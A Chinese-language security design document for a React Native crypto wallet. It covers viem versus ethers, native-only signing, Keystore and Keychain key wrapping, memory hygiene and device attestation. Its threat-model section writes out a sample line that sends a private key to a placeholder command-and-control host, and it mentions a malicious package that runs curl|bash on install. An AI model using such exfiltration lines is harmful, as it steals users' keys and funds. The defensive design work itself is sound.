### 2.5 Web3 层：viem 2.56.x vs ethers v6

链交互需求边界：EVM 地址派生校验、余额/行情读取、交易构造与广播；**签名在 native 层闭环，JS 不接触私钥**。

#### 2.5.1 对比表

| 维度 | viem 2.56.x ✅ | ethers v6 |
|---|---|---|
| 最新版/节奏 | 2.56.9（2026-09-24），近 52 周 **1038 commits**、周下载约 450 万（同比 +110%）[^45^] | 6.17.0（2026-06-18），近 52 周仅 **42 commits**（单人维护节奏）、周下载约 285 万[^45^] |
| RN polyfill 面 | 仅 2 个：`crypto.getRandomValues` + `TextEncoder`（官方 compatibility 页）[^46^][^47^] | 更宽：缺 node core 模块需 node-libs-react-native/rn-nodefy + babel 私有字段插件；官方从未提供 RN 入口点（ethers.js#3996 长期未关）[^48^] |
| 包体（min+gzip） | **约 35kB**，ESM 模块化可 tree-shake[^45^] | **约 200kB**，整体式导出，Metro 实验性 tree-shaking 收效有限[^45^] |
| RN Web 端 | 官方声明支持所有现代浏览器，BigInt/fetch/TextEncoder 原生存在，**零配置零 polyfill**[^46^] | 可用，但包体惩罚同样兑现 |
| 官方 RN 方案 | 社区主流 + 官方确认「不依赖浏览器 API，RN 可用」 | 官方 cookbook 要求引入 react-native-quick-crypto 并用 `.register()` 替换底层原语[^49^] |
| 外部签名工作流 | **一等 API**（见 2.5.2） | `Transaction.unsignedSerialized` + `Signature.from` + `broadcastTransaction`，可行但 API 分散 |
| 本体 CVE/GHSA | 无 | 无 |

**分析（约 170 字）**：三项量化指标全部单向倾斜：polyfill 面 2 个 vs 一组 hack、包体 35kB vs 200kB（约 6 倍，且 Metro tree-shaking 仍是实验特性，native bundle 同样兑现差距）、维护活跃度 1038 vs 42 commits/52 周——后者对金融工程是实质性风险信号：依赖库的响应速度决定了供应链事件与 Hermes v1 新引擎适配问题的修复时延。ethers v6 并非不可用，其官方 cookbook 的 quick-crypto 注册模式是成熟路径，但在「只用地址/序列化/广播」的本项目场景下，六倍包体与更宽的 polyfill 面换不来任何收益。已知 viem 在 RN 的坑（#4002 typed-array `.buffer` 边界行为、@noble/hashes exports 警告）均不影响本项目功能面，仅作真机验证清单项。

#### 2.5.2 签名工作流：viem 一等 API

viem 的 serializer 体系对「构造 → 序列化 → keccak256 → native 签名 → 拼装 → 广播」提供一等支持，全程私钥不出现：

```ts
import { createPublicClient, http, prepareTransactionRequest,
         serializeTransaction, parseTransaction, keccak256 } from 'viem';

const request = await prepareTransactionRequest(client, { account: address, to, value });
const unsigned  = serializeTransaction(request);            // 无签名 RLP
const digest    = keccak256(unsigned);                      // 送 native 的 32 字节
const sig       = await NativeSigner.sign(digest);          // 示意图：私钥不出 native；实际接口为 vault-core 的 signDigest(handle, path, digest)，返回 65B r‖s‖recid（spec: vault-core §2.1），EIP-155/yParity 编码由 JS 侧完成
const signedRaw = serializeTransaction(request, sig);       // 拼装签名
const hash      = await client.sendRawTransaction({ serializedTransaction: signedRaw });
```

`serializers.transaction(transaction, signature?)` 内置 Legacy/EIP-2930/EIP-1559，自定义链可注入 `serializers`；`sendRawTransaction` 正是应外部签名需求加入的 API（wevm/viem#785）；广播前用 `parseTransaction` 回读自检[^50^][^51^]。等价替代是 `toAccount` 把 native 签名器包装成 viem account，便于后续接 wagmi。

#### 2.5.3 Polyfill 清单与降级路径

最小 polyfill 集（三端共用，必须是 App 入口第一行 import，Web 端为 no-op）：

```ts
import 'react-native-get-random-values';          // 2.0.0：crypto.getRandomValues（新架构-only，最低 RN 0.81，与本工程兼容）
import 'fastestsmallesttextencoderdecoder';        // TextEncoder 防御性 polyfill（viem 官方推荐）
```

react-native-get-random-values 2.0.0（2025-10-22）起仅支持新架构，Android 用 SecureRandom、iOS 用 SecRandomCopyBytes，周下载约 190 万、无已知 CVE；注意其在 Chrome 远程调试下退化为 Math.random（带警告）——**真钱流程必须禁用远程调试**[^52^]。禁止引入已废弃的 `text-encoding`（npm 官方 DEPRECATED 标记）。**降级路径**：地址派生/校验的 JS 侧实现用 `@noble/curves/secp256k1` + `@noble/hashes`（viem 传递依赖，零新增供应链面；经 Trail of Bits / Kudelski / Cure53 等 4 次审计，纯 JS BigInt 无 WASM，Hermes 可用）[^53^]——**仅限联调占位 [S]，真钱路径禁用**，native 签名闭环一旦打通即移除。

#### 2.5.4 红线

- **web3.js 禁用**：ChainSafe 2025-01-15 宣布 sunset，**2025-03-04 仓库归档**，最终版 4.16.0，官方指引迁移至 ethers/viem[^54^]。
- **仿冒恶意包**：viem/ethers 本体无 CVE，但生态仿冒高发——`ethers-io` 仿冒包（GHSA-rmhg-qfp9-hvvm，postinstall curl|bash）、`@ensdomains/hardhat-chai-matchers-viem` 恶意包、`verify-contract-ethers`/`verify-contract-viem` typosquat 集群[^55^]。工程红线：lockfile 钉版 + CI 一律 `pnpm install --frozen-lockfile` + `--ignore-scripts`（根 `.npmrc` 全局配置）+ 官方包名逐字核对 + CI 供应链扫描。

> **定案（2.5）**：链交互唯一选型 **viem（pin 2.56.x）**；polyfill 仅 `react-native-get-random-values@^2.0.0` + `fastestsmallesttextencoderdecoder` 两项；不引入 Buffer shim / quick-crypto（原型无 keystore 解密需求）；签名走「prepareTransactionRequest → serializeTransaction → keccak256 → native 签名 → serializeTransaction(tx, sig) → sendRawTransaction」；@noble/curves 仅作联调占位；web3.js 与一切仿冒包列入禁用清单。

---

## 第3章 密钥安全架构

> 本章为全书核心章节。所有安全承诺均按三级标注：**[P] 已实现防护**（有密码学/硬件强制语义）/ **[C] 仅提高攻击成本**（可被足够耐心的高权限攻击者绕过）/ **[S] 占位接口**（仅声明、未实现）。除「检测信号与密钥可用性 fail-closed 耦合」外，一切端上检测均为 [C]。凡 3 天原型期内无法真机验证的项目，一律列入 roadmap 并如实标注不确定性。

### 3.1 三端信任分级总表与红线

NexVault 的三端移植不是「同一份密钥能力的复制」，而是按平台信任面差异做的**能力分级裁剪**：

| 端 | 信任等级 | 密钥能力 | 依据 |
|---|---|---|---|
| Android | 全功能 | 导入助记词、派生、签名、导出 | Keystore/StrongBox 硬件包裹 + per-use 生物识别 + Play Integrity/Key Attestation 双轨 [P]（硬件层） |
| iOS | 全功能 | 导入助记词、派生、签名、导出 | Keychain 生物识别 ACL（Secure Enclave 硬件强制门禁）+ App Attest [P]（门禁层） |
| Web | **只读** | 仅地址/xpub、余额、交易历史、构造未签名交易 | 无 attestation 能力、无法应用层 pinning、供应链投毒实证充分（详见 3.4） |

分析：这张表的核心不是「Web 端少做了功能」，而是一条单向不可逆的架构决策——Web bundle 的代码库从依赖裁剪与构建期 lint 两个层面**结构上不含任何私钥解密路径**（noble/curves 签名路径禁止进入 Web bundle），即使 Web 侧供应链被注入恶意代码也「无钥可偷」。相对地，Android/iOS 虽然全功能，但密钥使用的每一次都被硬件门禁（Keystore user-auth key / Keychain ACL）与服务端设备证明双重门控。信任分级的判断标准是「该端是否存在可被远程触达的攻击面且缺乏硬件锚点」：浏览器同时满足两条，故只读；原生两端有硬件锚点，故全功能但带门控。

**红线（写入 specs/ 宪法，任何迭代不得突破）：**

1. **私钥不出 native**：secp256k1 私钥、seed、链码的明文只存在于原生层（Kotlin/Swift/C++）内存中，驻留时间不超过单次签名调用；JS 层（Hermes 字节码视为明文）永不接触密钥材料。
2. **Web 永不持私钥**：Web 端不实现助记词导入、私钥解密、签名三个代码路径，不仅是「不调用」，而是构建产物中不存在这些符号。

### 3.2 Android：Keystore 包裹定案

#### 3.2.1 实证：Keystore/StrongBox 不支持 secp256k1

截至 2026-10，**没有任何 Android Keystore / StrongBox / KeyMint 实现支持 secp256k1**。AOSP 源码级证据：框架层曲线白名单 `SUPPORTED_EC_NIST_CURVE_NAME_TO_SIZE` 仅含 NIST P-224/256/384/521，Android 13 起另有 Ed25519/X25519；向 `KeyGenParameterSpec` 传入 secp256k1 会抛 `InvalidAlgorithmParameterException: Unsupported EC curve name`，实测白名单打印为 `[ed25519, p-224, p-256, p-384, p-521, prime256v1, secp224r1, secp256r1, secp384r1, secp521r1, x25519]`——其中无任何 k1 曲线 [^56^]。source.android.com 的 Keystore features 官方页同样只列 NIST P 系列 ECDSA [^57^]。行业横评确认 Apple Secure Enclave 同样仅 P-256，「主流手机/云 HSM 安全元件均无 k1 原生支持」 [^58^]。

结论：**把 k1 私钥放进 TEE/SE 内签名这条路在通用 Android 上物理不存在**。唯一例外是 Samsung Blockchain Keystore（见 3.2.6）。

#### 3.2.2 行业定案模式：AES-256-GCM wrap key 存 Keystore 包裹 k1

既然 k1 进不了 Keystore，行业事实标准是「**Keystore 保护一把对称包裹密钥，包裹密钥加密 k1，密文落应用私有存储**」：

- Pocket Node（CKB 钱包，文档明确）：「private keys encrypted at rest with AES-256-GCM. The encryption key lives in the Android Keystore, bound to user authentication… The private key is decrypted from Room into memory only for the duration of the signing call.」 [^59^]
- MetaMask Mobile（React Native）：金库由口令 PBKDF2 派生密钥加密，密文存 AsyncStorage；`SecureKeychain` 模块（基于 react-native-keychain）将口令存 Keystore 保护区实现生物识别解锁——即 k1 本身不进 Keystore，Keystore 只门控解锁凭据 [^60^]。
- Rainbow：使用 react-native-keychain 的 AES-GCM cipher storage（Keystore 后端） [^61^]。

NexVault 在此验证过的模式上加强三处：StrongBox 优先、per-use 生物识别绑定（MetaMask 的金库主加密仍依赖口令 PBKDF2，Keystore 仅门控口令读取）、attestation 绑定（见 3.8）。

#### 3.2.3 定案结构

```
[AndroidKeyStore / KeyMint]
  AES-256-GCM wrap key（alias: nexvault.wrap.v1，别名带版本号支持轮换）
    ├─ setIsStrongBoxBacked(true)          # 失败→捕获 StrongBoxUnavailableException→TEE 重试
    ├─ setUserAuthenticationRequired(true)
    │    + setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG | AUTH_DEVICE_CREDENTIAL)
    │    # 窗口=0：每次使用都需 BiometricPrompt(CryptoObject)
    ├─ setInvalidatedByBiometricEnrollment(true)
    ├─ setUnlockedDeviceRequired(true)      # 版本门控，见 3.2.4
    └─ 可选：setAttestationChallenge(服务端 nonce)
        ↓ 仅用于加解密
k1 私钥（32B，由 BIP39/32/44 派生，见 3.5）
    → AES-256-GCM(wrap key, 随机 12B IV, AAD=账户地址+用户ID)
    → 密文 blob「version ‖ IV ‖ ciphertext ‖ tag」存应用私有目录（Room），allowBackup=false
签名时：BiometricPrompt(CryptoObject) → Keystore 内 unwrap → native 短时解密 →
        打包新版 BouncyCastle 完成 secp256k1 签名（libsecp256k1 为 roadmap，见 3.5）→ 立即 zeroize
```

工程要点：

- **StrongBox→TEE 降级，绝不落软件**：探测 `PackageManager.FEATURE_STRONGBOX_KEYSTORE` 后尝试 `setIsStrongBoxBacked(true)`，捕获 `StrongBoxUnavailableException` 降级 TEE 并用 `KeyInfo.isInsideSecureHardware()` 校验；软件级仅模拟器/debug build 允许且打水印。依据：截至 2023 年仅约 45% Android 设备有安全元件，Play Store 上仅 4.6% 应用请求 StrongBox（5.15% 的引用者因性能或算法缺失关闭）——但包裹 32B 私钥远低于 StrongBox 约 0.2 MiB 的载荷阈值，性能不构成降级理由 [^62^]。CDD 中 StrongBox 为 STRONGLY RECOMMENDED 而非 MUST，故必须保留 TEE 档 [^63^]。
- **per-use 生物绑定是 root 防御的核心**（见 3.2.5）：`setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)` 中第一个参数即认证有效期窗口，0 = 每次密钥使用都要求当场 BiometricPrompt。冷钱包场景用户本就需要逐笔确认交易，UX 成本可接受。[P]（由 KeyMint/TEE 强制执行，非应用层逻辑）。
- **残余风险如实标注**：wrapped 模式的固有风险是「解密后内存驻留窗口」——CertiK 指出 Keystore 不提供区块链 API，钱包仍需在内存中持有解密后的私钥，特权攻击者可 dump 内存 [^64^]。缓解只有「最短驻留 + native 签名 + 显式清零」，无法根除；这是相对 TEE 内签名方案（三星）的本质差距，须写入威胁模型。[C]（对 root+精确时机 dump）。

#### 3.2.4 setUnlockedDeviceRequired 的版本门控

官方 API 文档明确警告：**Android 12–14（API 31–34）存在已知 bug**——无安全锁屏时此类密钥无法生成/导入/使用；移除锁屏会自动删除所有此类密钥；非强生物识别（如许多机型的 2D 人脸）解锁不会重新授权 [^65^]。对钱包而言「丢密钥=丢资产」。定案：**API ≥ 35 默认开启；API 28–34 默认关闭**（该 flag 仅作增强层而非安全边界，真实边界由 per-use 生物绑定承担）。同时必须实现 `KeyPermanentlyInvalidatedException` 恢复流（生物特征变更/锁屏移除后从助记词重新派生）。

#### 3.2.5 root 下「不可导出但可被调用」的防御

Keystore 的真实威胁模型不是「密钥被导出」，而是「**任何能以 app 身份（同 UID / 注入进程）触达 Keystore daemon 的代码都可使用密钥**」。防御核心是把「使用」密码学绑定到真实用户在场：`setUserAuthenticationRequired(true)` + per-use `AUTH_BIOMETRIC_STRONG` + `setInvalidatedByBiometricEnrollment(true)`。Critical Security 对 Revolut Business 的绕过演示正是「密钥未密码学绑定生物识别」的实现缺陷 [^66^]；而启用了 user-auth 的密钥即使内核被攻破也无法被提取 [^67^]。在此防御下，root 攻击者注入 app 进程后每次签名都会触发真实 BiometricPrompt，无法静默签走资金。[P]（硬件强制门禁）；对「root + 实时内存 dump 签名窗口」仍为 [C]。

#### 3.2.6 Samsung Blockchain Keystore：可选增强

三星私有 SDK「Samsung Blockchain Keystore」预装于部分 Galaxy 设备，TEE 内原生支持 ECDSA/secp256k1 签名（Bitcoin/Ethereum），带 TUI 可信显示 [^68^]——这是唯一能让 k1 明文完全不进宿主内存的设备端方案。但仅覆盖指定 Galaxy 机型、需集成私有 SDK、存在供应商锁定与长期存续风险（Knox SDK 部分 API 已 deprecated）。定案：**列入 roadmap 二期评估，不进入主路径**。[S]

### 3.3 iOS：expo-secure-store 定案

#### 3.3.1 库选型

| 维度 | react-native-keychain | expo-secure-store |
|---|---|---|
| 维护方 | 社区志愿者 | Expo 官方 monorepo |
| 最新版本 | 10.0.0（2025-03-23，停滞 ~19 个月） | 57.0.4（2026-09-11），随 SDK 持续发版 |
| 近 6 个月提交 | 1 次（chore，GitHub API 实测） | 随 SDK 55→58 持续演进，Snyk 评级 Healthy、周下载约 665 万 |
| iOS 底层 | Keychain（kSecClassGenericPassword）+ ACL | 同左 |
| 生物识别门禁 | 完整 ACCESS_CONTROL 枚举 | `requireAuthentication: true`（读取需生物识别/密码，生物特征变更自动失效） |
| SE 内 P-256 keygen | ❌ 未暴露 kSecAttrTokenIDSecureEnclave | ❌ 同 |
| 值大小 | 无硬限 | 2048B 警告上限（足够存 32B 密钥材料） |
| 头部钱包采用 | MetaMask / Rainbow / BlueWallet | Expo 生态标准件 |

分析：两者底层相同（Keychain + SecAccessControl 生物识别门禁），功能上 react-native-keychain 的 ACCESS_CONTROL 粒度更细且被头部钱包生产验证；但 10.0.0 后 19 个月无发布、近 6 个月仅 1 次 chore 提交、存在未修复的生物识别 ACL issue（#783）——冷钱包不宜把密钥关键路径押在停滞库上，这与本报告「最新≠最安全，但停滞=不可接受」的依赖准入门禁一致。expo-secure-store 由 Expo 官方随 SDK 维护、与 CNG 工作流零摩擦，2048B 上限对本场景（存一把 32B AES 密钥或小型加密包）不构成约束。定案：**expo-secure-store 为主；若二期需要 BIOMETRY_CURRENT_SET 级细粒度门禁再评估 react-native-keychain（届时需锁定版本并复核 issue 修复状态）** [^69^]。

#### 3.3.2 分层包裹方案

Secure Enclave 只支持 256-bit EC（P-256）私钥，且密钥必须在 SE 内生成、不可导入外部密钥 [^70^]——k1 私钥进不了 SE。工程上能达到的上限是「**用 SE 硬件强制的门禁保护 k1 的解密密钥**」：

1. 随机 32B AES 密钥 → AES-256-GCM 加密 k1 私钥/助记词加密包 → 密文存 expo-secure-store（或应用沙盒文件）。
2. AES 密钥作为条目存 expo-secure-store：`requireAuthentication: true` + `keychainAccessible: WHEN_UNLOCKED_THIS_DEVICE_ONLY`（或 WHEN_PASSCODE_SET_THIS_DEVICE_ONLY）、`synchronizable=false`（禁 iCloud 同步）。**关键性质：带生物识别 ACL 的 Keychain 条目，其 ACL 校验由 Secure Enclave 硬件强制**——越狱设备上 keychain_dumper 可静态 dump 无 ACL 条目，但无法静默 dump 生物识别门禁条目，攻击者必须实时通过生物识别/密码才能释放 [^71^]。[P]（SE 硬件强制门禁）；对「用户已解锁后 Frida 钩 SecItemCopyMatching 截获明文」为 [C]。
3. **口令兜底（保留）**：参照 MetaMask，用户口令经 Argon2id/PBKDF2 派生 KEK 再包一层——「设备被强制解锁」场景下仍有口令防线，App 未输口令前无法解密。
4. **SE P-256 包裹列 v2**：用 expo prebuild 写约 50 行 Swift 薄模块（SecKeyCreateRandomKey + kSecAttrTokenIDSecureEnclave，Apple 官方文档有完整样例）在 SE 内生成 P-256 密钥，ECDH 派生 KEK 包裹 AES 密钥，实现「解密密钥永不进应用内存」 [^70^]。[S]（v2 占位；模拟器无 SE，必须真机测试）。
5. **react-native-secure-sign 类库不进关键路径**：RN 生态能做 SE P-256 签名的库（react-native-secure-sign、react-native-device-binding、expo-hardware-key 等）均为 0–极少 dependents 的个人维护新库，无安全审计背书——冷钱包关键路径不采用 [^72^]。

### 3.4 Web 降级定案：只读观察钱包 + WalletConnect 桥接

**定案：Web 端 = 只读观察钱包（地址/xpub、余额、交易历史、构造未签名交易）+ WalletConnect（Reown AppKit/WalletKit）桥接回手机签名。v1 可先以「二维码导出未签名交易 → 手机扫码签名 → 二维码回传结果」的纯离线闭环替代，零网络依赖，更贴合冷钱包定位。**

论据链（三条独立成立，任一成立结论即成立）：

1. **供应链投毒实证**：2025-09 chalk/debug 事件——18+ 个 npm 包、合计 20 亿周下载被注入钩子 window.ethereum/fetch/XHR 专门窃取浏览器内加密交易的 payload [^73^]；Shai-Hulud npm 蠕虫感染 700+ 包、造成约 5800 万美元加密资产损失 [^74^]；2025-12 Trust Wallet Chrome 扩展 v2.68 供应链投毒，2500+ 钱包、850 万美元损失，助记词被伪装成遥测数据外泄 [^75^]。RN Web 三端共享代码库意味着 Web bundle 天然携带大量 npm 依赖，任何一次依赖投毒都在此爆炸半径内。
2. **无 attestation 能力**：Google 的 Web Environment Integrity 提案已撤回，浏览器无设备/客户端完整性证明能力；WebAuthn attestation 只能证明 authenticator 型号（AAGUID），同步 passkey 干脆不携带 attestation statement [^76^]。
3. **无法应用层 pinning**：浏览器 TLS 栈不接受应用层证书固定，Web 端无法实现 native 侧 @bam.tech/react-native-app-security 双 SPKI pin 的等价物；页面还与任意第三方脚本、恶意扩展共享 JS 执行环境，WebCrypto 的 non-extractable key 不支持 secp256k1。

桥接技术栈：Web 端（dApp 侧）用 `@reown/appkit`（或 AppKit Core + UniversalProvider），RN 端（钱包侧）用 `@reown/walletkit` 接收 session_proposal/session_request 并在手机端确认签名——2026 年两者均官方支持 RN（需 `@walletconnect/react-native-compat` 首行导入）；WalletConnect 网络覆盖 40k+ dApps、600+ 钱包，协议存续风险低 [^77^]。已知限制：长连接偶发掉线需自行处理 session 过期/重连 UX。

**Passkey PRF 仅列 v2 可选**：WebAuthn PRF 扩展 2026 年支持面仍碎片化——Safari 26.4（2026-03）才补上安全密钥 PRF 且存在两个未修复的 WebKit bug（311099/314934），iOS 18.0–18.3 有 CDA 数据丢失 bug；且 PRF 输出派生 k1 密钥无标准、换浏览器/丢认证器即丢密钥 [^78^]。可作 v2「Web 端本地数据加密」增强，**不可作为密钥托管方案**。[S]

### 3.5 native 闭环：expo local module 四方法

**定案（3 天关键路径，最高优先级）**：`modules/vault-core`（expo local module，Kotlin + Swift），暴露四个方法：

```ts
import * as Vault from 'vault-core';
const h: number = await Vault.importMnemonic(wordsBytes /* ArrayBuffer，逐词 0x20 连接 */);
const addr: string = await Vault.deriveAddress(h, "m/44'/60'/0'/0/0");
const sig: ArrayBuffer = await Vault.signDigest(h, "m/44'/60'/0'/0/0", digest32);
await Vault.destroy(h); // 全链清零：mnemonic→seed→各级 privkey/chaincode
```

工程纪律：

- **JS↔native 只传 ArrayBuffer + opaque handle**：expo-modules-core 官方支持 ArrayBuffer 参数/返回类型，可零拷贝传入；密钥以 opaque 数字 handle 驻留 native 堆，JS 侧永不接触明文。禁 `jsi::String` 传秘密（JS 字符串不可变、驻留 Hermes 堆至 GC）；JSI 拿到的裸指针必须同步拷贝后使用，异步持指针有 use-after-free 风险 [^79^]。
- **签名原语分级：MVP 用平台成熟库，libsecp256k1 v0.7.0 列为 roadmap**：MVP（3 天原型）的 secp256k1 运算在 vault-core 模块内用平台成熟库实现——Android 侧打包新版 BouncyCastle、iOS 侧走 Blockstream 官方 Swift 绑定 swift-secp256k1（SPM）配合 CryptoKit（与 specs/vault-core.md §2.2/§2.3 一致）；**libsecp256k1 v0.7.0**（bitcoin-core/secp256k1：MIT license、零依赖、常数时间、Bitcoin Core 生产级；编译产物约 1.3MB/ABI；官方 README 直接给出 Android NDK CMake 交叉编译命令）经 **CMake 集成列为 roadmap**——即下条「C++ 化 roadmap」的共享核心签名原语，不占 3 天关键路径 [^80^]。
- **wallet-core 4.8.4 仅备选**：Trust Wallet 官方团队活跃维护，但 (a) CVE-2025-66692（`PublicKey::verify()` 缓冲区越界读，影响 <4.4.0，集成必须 ≥4.4.0）；(b) 其 HDWallet API 以 `String` 形态返回助记词，驻留 JVM/Swift 堆无法可靠清零，与清零红线结构性冲突；(c) 二进制体积数十 MB 量级（全链全 ABI）；(d) 无官方 RN binding，社区 binding 走 Classic Bridge 且助记词以 String 出 native [^81^]。自研薄封装与包 wallet-core 工作量相当，故不选。
- **@noble/curves 仅联调降级占位，真钱路径禁用**：官方 README 自述——「JIT 与 GC 使常数时间在脚本语言中极难实现……如果目标是绝对安全，不要用任何 JS 库」；且 JS 无法可靠清零 [^82^]。允许用途：开发期与 BIP39/BIP32 官方测试向量交叉对拍、native 模块阻塞超半天时的联调占位（Insight 4 降级预案）。
- **C++ 化 roadmap**：共享 C++ 核心（BIP32/39/44 + libsecp256k1）经 JSI 直连（Expo 官方文档明示 C++ 主体模块应走 Turbo Modules API），Kotlin/Swift 退为薄壳；native UI 输入（Compose/SwiftUI 自定义键盘）使 JS 完全零接触助记词 [^23^]。[S]

排期：D1 脚手架 + Android BIP39/32/44（BIP39/BIP32 官方测试向量 instrumentation test 全绿）；D2 Android signDigest（RFC6979）+ zeroize + iOS 移植；D3 iOS 联调 + 安全外壳（3.6）+ memory-hygiene 压测（import/destroy 循环 1000 次无泄漏）。

**与原 Kotlin 版的叙事连续性**：原版 NexVault（纯 Kotlin，20 模块 Clean Architecture）的签名路径为「WalletStore/MnemonicManager + HDKeyManager 会话门控取钥 → web3j 签名 → `SecurityUtils.secureWipe()` 立即擦除 → ChainRpcClient 广播」，且 AGENTS.md 宪法明文「never log key material or mnemonics」「never write key material to disk unencrypted」、Gradle 依赖 SHA-256 校验。RN 版完整继承这套纪律并收紧两点：密钥明文从「JVM 堆短时驻留」下沉为「native 堆 + opaque handle」（JS 层零接触），存储层从「Keystore 主密钥 + Tink AEAD」升级为「StrongBox 优先 + per-use 生物绑定 + attestation 绑定」。规格纪律同样平移：vault 模块的每处密钥路径以测试向量与 memory-hygiene 用例挂钩（TC-SEC 编号体系），禁止任何「界面看起来能用」的占位实现。

### 3.6 内存安全清单

| # | 措施 | Android | iOS | 承诺级别 |
|---|---|---|---|---|
| 1 | 禁 String 存密钥材料 | String 不可变驻留堆至 GC；用 ByteArray/CharArray + `Arrays.fill(0)`；ART compacting GC 可能复制对象，缩短生命周期补偿 | String COW 复制；用 Data/[UInt8] + `resetBytes(in:)`/`memset_s` | [P]（对落盘/长期驻留）；[C]（对 GC 复制残留） |
| 2 | 用完 zeroize | 签名后 native 显式 fill(0)；参照 react-native-quick-crypto 2026-04 安全审计引入 secureZero 助手的同口径规范 | 同左 | [P] |
| 3 | mlock 防 swap | bionic 提供 mlock/mlockall；防 zRAM swap 与 core dump 泄露。受 RLIMIT_MEMLOCK 约束（内核历史默认 64KB，**各 ROM 实测值不同，按机型探测、失败降级记录而非中断**）；模式：mmap 一页→mlock→explicit_bzero→munlock | **无语义保证**：iOS 无磁盘 swap（内存压缩代替），swap 泄露面天然低；XNU 虽有 mlock 调用，但沙盒 App 调用成功性无 Apple 官方文档保证（仅单一商业 SDK 来源声称可用，置信低）。如实标注为已知限制，以防 swap 依赖「无 swap + 短时驻留 + zeroize」补偿，列真机验证项 | [C]（Android 探测降级）；[C]（iOS，不确定项如实呈现） |
| 4 | 防截屏/录屏 | expo-screen-capture `preventScreenCaptureAsync()` → FLAG_SECURE（recent apps 预览同步空白）；14+ 截屏回调免权限 | 无 FLAG_SECURE 等价物；用 `enableAppSwitcherProtectionAsync` 模糊遮罩 + 截屏通知审计日志 | [P]（Android）；[C]（iOS 截屏只能检测不能阻止） |
| 5 | 安全键盘 | IME 天然收到全部击键，`IME_FLAG_NO_PERSONALIZED_LEARNING`/`textNoSuggestions` 只是提示而非强制边界；**助记词输入用应用内自定义词格键盘**（BIP39 词表前缀匹配按钮网格，字节直送 native buffer，禁系统 IME） | 三方键盘在 secure text entry 下被系统强制替换，但助记词非 password 语义，仍需自定义键盘 | [P]（自定义键盘路径）；[S]（完整版 roadmap） |
| 6 | 禁剪贴板处理助记词 | 助记词/私钥路径完全禁止剪贴板；地址可复制（公开信息，可选 EXTRA_IS_SENSITIVE 防 13+ 预览浮层肩窥） | 无敏感标记机制；如必须复制：定时清空 + localOnly 防 Universal Clipboard | [P]（架构性禁止） |

### 3.7 威胁案例防御论证：「重打包 + 私钥明文处加一行上报 C&C」为何逐层失效

设定最强攻击剧本：攻击者拿到 NexVault APK，反编译（Hermes 字节码视为明文，JS 层逻辑全透明），在「私钥明文出现的地方」加一行 `fetch('https://c2.example/?k='+key)`，重打包后诱导用户安装。该木马失效的逻辑链如下，**核心在架构而非检测层**：

1. **JS 层无明文可加钩**（架构层，[P]）：私钥/助记词/seed 明文从不以 JS 值形态存在（3.5：只传 ArrayBuffer 与 opaque handle，密钥驻留 native 堆）。攻击者在 Hermes 字节码里找不到「私钥明文出现处」——唯一能钩的是 `importMnemonic` 的输入字节与 `signDigest` 的 digest，前者钓不到已入库用户，后者只含公开交易哈希。攻击面被架构压缩到「必须攻破 native 层」。
2. **native 层重打包过不了验真**（密码学层，[P]）：攻击者改 native 库后必须重签名。服务端侧，Key Attestation 扩展中的 `attestationApplicationId` 与 Play Integrity 的 `appIntegrity` verdict 均绑定官方签名证书摘要——重打包包 `appIntegrity=UNRECOGNIZED_VERSION`，直接落入 L3 橙级（3.9），签名/导出/改设置全部 fail-closed。攻击者无法伪造：attestation 私钥在 TEE/StrongBox 内，且密钥生成时绑定了官方 app 身份。
3. **即使绕到密钥使用点，还有硬件门禁**（硬件层，[P]）：wrap key per-use 绑定 AUTH_BIOMETRIC_STRONG（3.2.5），任何签名触发真实 BiometricPrompt——木马无法静默签；生物特征变更即密钥失效。
4. **检测层只是最后一道 [C]**：root/Frida/重打包本地检测在攻击者设备上均可被足够耐心的攻击者绕过，本章不依赖它们守住密钥；它们的价值是抬高攻击成本、制造遥测信号喂给服务端风控。

结论：木马失效不是靠「检测出重打包」（那可以被 patch 掉），而是因为**私钥不出 native 使 JS 层无密可窃、签名闭环使密文与密钥使用权分离、attestation 使重打包包无法获得服务端信任**——三层都是攻击者无法从客户端单方面改变的结构性事实。这是本报告威胁模型校准的基准论证范式。

### 3.8 设备证明双轨：Play Integrity 主 + TEE Key Attestation 降级

#### 3.8.1 双轨语义

Play Integrity 与 Key Attestation 防的是不同层，不互斥：

| 维度 | Play Integrity API | TEE/KeyMint Key Attestation |
|---|---|---|
| 证明对象 | app 完整性（未重打包/PLAY_RECOGNIZED）+ 设备环境（MEETS_BASIC/DEVICE/STRONG） | 「该公钥对应的私钥由此设备硬件（TEE/StrongBox）持有」+ rootOfTrust（锁定 bootloader/verified boot/补丁级别） |
| GMS 依赖 | 依赖 Play Services | 不依赖（AOSP 级能力，除吊销列表外不需要 Google 服务） |
| 频限 | 有：默认 10k 请求/天/项目，Classic 每实例 ≤5 token/分钟 | 无频限 |
| 验证位置 | 服务端 decodeIntegrityToken 验 JWT | 服务端验证书链至 Google Hardware Attestation Root |
| 典型用途 | 日常环境信号 + 高价值操作守门 | 密钥生成时硬件归属绑定 + 无 GMS 降级 |

分析：两轨组合的关键是「证明对象正交」。Play Integrity 能证 app 没被重打包，但证不了「某个具体密钥在硬件里」；Key Attestation 能证密钥的硬件归属且脱 GMS 可用，但**不证明 app 二进制与安装渠道**——必须靠校验 `attestationApplicationId` + 服务端登记的签名证书摘要做 app 绑定。已知攻击面是 attestation relay（root 设备把 challenge 转发给干净真机代答，Quarkslab 2026 实证可全链路通过验证），缓解为两招：服务端校验 attestationApplicationId，以及**会话内要求用已证明密钥做持续签名质询**（relay 方无法长期代持签名能力）[P 对密钥归属 / C 对 relay 缓解]。无 GMS 华为海外版设备 Key Attestation 多数仍可用（链到 Google root 或 OEM 自签 root），但供给情况需真机验证，验证失败/缺失一律降风险标记而非硬拒绝（避免误伤）。

#### 3.8.2 Play Integrity 主轨工程细节

- **Standard 用于日常**：on-device 缓存、预热后数百毫秒、requestHash 绑定动作摘要；**Classic 守门高价值操作**（助记词导出、签名广播、改安全设置）：每次全新服务端评估、秒级、服务端 nonce 入响应 token 防重放 [^83^]。
- **三级 verdict**：MEETS_BASIC / MEETS_DEVICE_INTEGRITY / MEETS_STRONG_INTEGRITY；**STRONG 不硬卡**——2024-12 起 Android 13+ 设备要求 12 个月内有安全补丁才能拿 STRONG，老设备天然拿不到，硬卡会误伤大量真实用户（官方原话建议准备 fallback） [^84^]。门槛定为 DEVICE，STRONG 作加分项。
